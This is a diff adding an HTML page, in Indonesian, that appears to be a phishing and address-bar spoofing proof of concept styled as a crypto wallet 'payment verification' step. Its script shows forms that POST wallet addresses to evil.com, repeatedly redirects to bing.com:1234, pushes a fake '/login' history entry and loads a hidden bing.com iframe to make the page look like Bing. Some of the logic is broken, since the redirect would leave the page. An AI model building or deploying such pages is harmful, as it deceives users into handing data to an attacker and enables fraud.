@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Cryptocurrency Wallet - Verifikasi Pembayaran</title>
+</head>
+<body>
+    <h2>Verifikasi Pembayaran Diperlukan untuk Melanjutkan</h2>
+    <button onclick="startSpoof()">Mulai Uji Spoofing</button>
+    
+    <div id="crypto-wallet-form" style="display:none;">
+        <form method="POST" action="https://evil.com/submit" autocomplete="on">
+            <label for="crypto-wallet">Alamat Wallet Kripto:</label><br>
+            <input type="text" id="crypto-wallet" name="crypto-wallet" placeholder="Alamat Wallet Kripto (contoh: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)" autocomplete="off" required><br><br>
+            
+            <input type="submit" value="Verifikasi Pembayaran">
+        </form>
+    </div>
+
+    <script>
+        function startSpoof() {
+            // Langkah 1: Tampilkan form wallet kripto setelah spoofing address bar dimulai
+            document.getElementById("crypto-wallet-form").style.display = "block";
+
+            // Langkah 2: Buat elemen form dinamis tanpa mengganti seluruh halaman
+            const spoofedForm = document.createElement('div');
+            spoofedForm.innerHTML = `
+                <h2>Masukkan Alamat Wallet Kripto untuk Verifikasi Pembayaran</h2>
+                <form method="POST" action="https://evil.com/submit" autocomplete="on">
+                    <label for="crypto-wallet">Alamat Wallet Kripto:</label><br>
+                    <input type="text" id="crypto-wallet" name="crypto-wallet" placeholder="Alamat Wallet Kripto (contoh: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)" autocomplete="off" required><br><br>
+                    
+                    <input type="submit" value="Verifikasi Pembayaran">
+                </form>
+            `;
+            document.body.appendChild(spoofedForm); // Menambahkan form ke dalam body tanpa mengganti konten yang sudah ada
+
+            // Langkah 3: Spoofing URL address bar ke `bing.com`
+            document.location = "https://bing.com:1234";
+            setInterval(function() {
+                document.location = "https://bing.com:1234";
+            }, 11000);  // Interval untuk menjaga spoofing URL
+
+            // Langkah 4: Manipulasi history untuk menjaga URL di address bar
+            history.pushState({}, "Bing.com - Verifikasi Pembayaran", "/login");
+
+            // Langkah 5: Gunakan iframe tersembunyi untuk menjaga konsistensi URL spoofing
+            let hiddenFrame = document.createElement("iframe");
+            hiddenFrame.style.display = "none";
+            hiddenFrame.src = "https://bing.com";
+            document.body.appendChild(hiddenFrame);
+
+            setInterval(function() {
+                hiddenFrame.src = "https://bing.com";
+            }, 15000); // Interval untuk iframe lebih panjang
+        }
+    </script>
+</body>
+</html>
